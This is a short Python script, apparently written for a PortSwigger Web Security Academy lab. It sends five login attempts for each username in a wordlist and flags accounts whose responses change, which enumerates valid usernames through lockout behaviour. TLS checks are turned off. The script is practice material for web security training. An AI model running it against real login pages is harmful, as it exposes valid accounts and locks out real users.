import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    

BASE_HEADERS={
    "User-Agent" : "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded"
}

url = "https://0a9a009c03e15193810a07c4006c0031.web-security-academy.net/login"

password = "test"
attempt_per_user = 5

use=[]
with open("username.txt","r") as f:
    for i in f:
        i = i.strip()
        if i:
            use.append(i)

 
def test_users(use):
    result={}
    for user in use:
        s = requests.session()
        s.headers.update(BASE_HEADERS)
        user_results = []
        payload = { "Username":user, "Password":password }
        for i in range(attempt_per_user):
            try:
                r = s.post(url,data=payload,verify=False)
                user_results.append((r.status_code,len(r.content)))
            except requests.RequestException as e:
                print(f" attempt {i+1} : request failed :{e}")
        result[user] = user_results
    return result

def analyze(result):
    varying = {}
    for users, attempt in result.items():
        lengths = []
        for code,length in attempt:
            if length is not None:
                lengths.append(length)
        if len(set(lengths)) > 1:
            varying[users]=attempt
    return varying

if __name__ == "__main__":
    all_results = test_users(use)
    different = analyze(all_results)
    if different:
        print("Users with varying response length/statuses:")
        for u,att in different.items():
            print(f"{u}:{att}")
    else:
        print("All users had consisten response lengths/status code across attempts")




